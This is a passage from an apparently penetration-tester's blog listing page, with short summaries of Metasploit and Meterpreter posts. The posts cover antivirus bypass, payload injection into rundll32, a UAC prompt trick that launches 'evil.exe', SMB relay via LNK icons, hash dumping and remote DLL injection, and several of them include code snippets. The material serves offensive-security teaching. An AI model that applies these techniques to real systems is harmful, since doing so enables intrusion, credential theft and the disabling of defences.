hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st ); } It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;).
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-06-28-netstat-post-module-for-meterpreter/">Netstat Post Module for Meterpreter</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>28</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Submitted it to MSF via pull request here: https://github.com/rapid7/metasploit-framework/pull/538 Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb I promised this one a while ago, sorry for the delay. This only does TCP, it&rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&rsquo;s real simple, first we&rsquo;ve gotta add the GetTcpTable function to railgun: session.railgun.add_function('iphlpapi', 'GetTcpTable', 'DWORD', [ ['PBLOB', 'pTcpTable', 'out'], ['PDWORD', 'pdwSize', 'inout'], ['BOOL', 'bOrder', 'in'] ]) Then gauge the size of the table: getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true) buffersize = getsize['pdwSize'] Run the call again with the correct buffer size: tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true) Then it&rsquo;s all just parsing the result.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-06-28-netstat-post-module-for-meterpreter/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/">Integration of Mimikatz into Metasploit Stage1</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>15</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level. Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/">Developing the LNK Metasploit post module with Mona</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>19</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Feb</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-lnk" href="https://room362.com//categories/lnk">lnk</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-mona" href="https://room362.com//categories/mona">mona</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/">MS08_068 &#43; MS10_046 = FUN UNTIL 2018</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>11</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Feb</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>5 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-lnk" href="https://room362.com//categories/lnk">lnk</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-smbrelay" href="https://room362.com//categories/smbrelay">smbrelay</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	*TL;DR:* SMB Relay + LNK UNC icons = internal pentest pwnage I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own. MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/ In 2008, Microsoft released MS08_068 which patched the &ldquo;SMB Relay&rdquo; attack.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-01-03-uac-user-assisted-compromise/">(UAC) User Assisted Compromise</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>3</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-uac" href="https://room362.com//categories/uac">uac</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	A number of times during tests I&rsquo;ve actually run into those mythical creatures called &ldquo;patched windows machines&rdquo;. At DerbyCon Chris Gates and I released the &ldquo;Ask&rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&rdquo;) via Railgun with the undocumented (but very well known) operator of &lsquo;runas&rsquo;. These two lines accomplished that: client.railgun.add_function( 'shell32', 'ShellExecuteA', 'DWORD',[[&quot;DWORD&quot;,&quot;hwnd&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpOperation&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpFile&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpParameters&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpDirectory&quot;,&quot;in&quot;],[&quot;DWORD&quot;,&quot;nShowCmd&quot;,&quot;in&quot;],]) client.railgun.shell32.ShellExecuteA(nil,&quot;runas&quot;,&quot;evil.exe&quot;,nil,nil,5) This would quite simply prompt the user with that annoying UAC prompt asking the user to run &lsquo;evil.exe&rsquo; with Administrative privs.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-01-03-uac-user-assisted-compromise/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-11-02-run-post-modules-on-all-sessions/">Run POST Modules On All Sessions</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>2</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Nov</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-post-modules" href="https://room362.com//categories/post-modules">post modules</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Jcran recently blogged about an easy way to run a post module on all sessions: http://blog.pentestify.com/simple-framework-domain-token-scanner msf&gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&gt; irb framework.sessions.each do |session| run_single(&quot;set SESSION #{session.first}&quot;) run_single(&quot;run&quot;) sleep 1 end You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-11-02-run-post-modules-on-all-sessions/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-10-09-msfconsole-prompt-fiddling/">MSFConsole Prompt Fiddling</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>9</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-msfconsole" href="https://room362.com//categories/msfconsole">msfconsole</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	In @carnal0wnage and my presentation at DerbyCon 2011 we talked about using SCREEN and SCRIPT to keep connections live / use them across SSH sessions, and log everything that happens. What we didn&rsquo;t cover is the fact that there isn&rsquo;t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs: cat ~/.msf4/logs/framework.log This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn&rsquo;t record what you are doing inside of msfconsole msf&gt; spool ~/myclient.log The spool command is great for logging output from anything you do in either consoles or sessions, even when you drop to a shell.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-10-09-msfconsole-prompt-fiddling/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/">The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>6</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-derbycon" href="https://room362.com//categories/derbycon">derbycon</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-pentesting" href="https://room362.com//categories/pentesting">pentesting</a>
      					
					        <a class="post-category post-category-cons" href="https://room362.com//categories/cons">cons</a>
      					
					        <a class="post-category post-category-presentations" href="https://room362.com//categories/presentations">presentations</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Video: Slides: The Dirty Little Secrets They Didn&rsquo;t Teach You In Pentesting Class [slideshare id=9530403] Code: https://github.com/mubix/Not-In-Pentesting-Class
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/">Metasploit Payloads Explained - Part 1b</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>17</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-payloads" href="https://room362.com//categories/payloads">payloads</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (more info). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm). Here is the link to the ticket about the change (link) and the revision (r13057) TL;DR version: This change allows you to put multiple payloads into one binary&hellip; ya..
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/">Metasploit Payloads Explained - Part 1a</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>26</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-payloads" href="https://room362.com//categories/payloads">payloads</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	In Part 1 I gave an example I used at CCDC with the single &lsquo;windows/download_exec&rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &lsquo;anything&rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &lsquo;windows/download_exec&rsquo;, but the file it needs to execute).
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-06-26-metasploit-payloads-explained-part-1/">Metasploit Payloads Explained - Part 1</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>26</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>5 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-payloads" href="https://room362.com//categories/payloads">payloads</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _windows/meterpreter/reverse_tcp_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-06-26-metasploit-payloads-explained-part-1/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/">Remotely Suspend All Threads with Meterpreter</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>30</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well. Another way you can do this without the injection is just sending a suspend to all the threads in the process. pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.thread.each_thread do |x| targetprocess.thread.open(x).suspend end We open the process just like we did before, and make a very simple &lsquo;each_thread&rsquo; loop.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/">Remote DLL Injection with Meterpreter</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>30</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-dllinjection" href="https://room362.com//categories/dllinjection">dllinjection</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Recently Didier Stevens wrote &lsquo;Suspender.dll&rsquo; which is a DLL that will suspend a process and all of it&rsquo;s child processes after a delay. 60 seconds is it&rsquo;s default but you can rename the DLL to add a number (as such &lsquo;Suspender10.dll&rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/ Jonathan Cran and I had the same idea, as I&rsquo;m sure many others did as well.
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/">Dumping Hashes on Win2k8 R2 x64 with Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>16</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2011</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>5 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-hashdump" href="https://room362.com//categories/hashdump">hashdump</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-cracking" href="https://room362.com//categories/cracking">cracking</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first: ## ### ## ## ## ## #### ###### #### ##### ##### ## #### ###### ####### ## ## ## ## ## ## ## ## ## ## ### ## ####### ###### ## ##### #### ## ## ## ## ## ## ## ## # ## ## ## ## ## ## ##### ## ## ## ## ## ## ## #### ### ##### ##### ## #### #### #### ### ## =[ metasploit v3.7.1-release [core:3.7 api:1.0] + -- --=[ 687 exploits - 364 auxiliary - 43 post + -- --=[ 217 payloads - 27 encoders - 8 nops =[ svn r12622 updated today (2011.05.15) msf &gt; [*] DC_IP:49220 Request received for /AYSBk...
            </article>
			<div class="read-more-link">
				<a href="/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-12-25-delicious-webapp-hacking/">Delicious Webapp Hacking</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>25</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-delicious" href="https://room362.com//categories/delicious">delicious</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	[UPDATE] This module (enum_delicious) has been pulled from Metasploit since Delicious no longer allows searching by site. In the last post I showed off how Archive.org&rsquo;s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service). I&rsquo;ve seen people bookmark everything from internal web portals to urls with special no-auth passwords in them.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-12-25-delicious-webapp-hacking/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-12-24-wayback-webapp-hacking/">Wayback Webapp Hacking</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>24</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-wayback" href="https://room362.com//categories/wayback">wayback</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you&rsquo;ll find parts of web apps that have been long forgotten (and usually vulnerable). This module doesn&rsquo;t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.org.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-12-24-wayback-webapp-hacking/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-12-23-project-honeypot-http-blocklist-module/">Project Honeypot HTTP Blocklist module</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>23</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-honey-pot" href="https://room362.com//categories/honey-pot">honey pot</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting. These don&rsquo;t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or &lsquo;HTTP:BL&rsquo;. Another way this list differs from the rest is it isn&rsquo;t a list you can download.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-12-23-project-honeypot-http-blocklist-module/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-11-16-silently-uninstall-sep-html/">Silently uninstall SEP</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>16</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Nov</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-symantec" href="https://room362.com//categories/symantec">symantec</a>
      					
					        <a class="post-category post-category-sep" href="https://room362.com//categories/sep">sep</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Uninstallation is not new Deleting and removing things on a box you own isn&rsquo;t new This method and how to do it remotely was posted in Feb 2007 But I didn&rsquo;t know how to do it, and I thought it was hilarious, so I made a video:
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-11-16-silently-uninstall-sep-html/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-09-13-am-i-an-admin-railgun-script/">Am I an Admin? Railgun Script</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>13</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &ldquo;Adminitrators&rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &lsquo;getsystem&rsquo; and if one works other than Kitrap0d. You could also just do a &lsquo;ps&rsquo; and notice that you can see &lsquo;SYSTEM&rsquo; processes.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-09-13-am-i-an-admin-railgun-script/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/">Rapid fire PSEXEC for Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
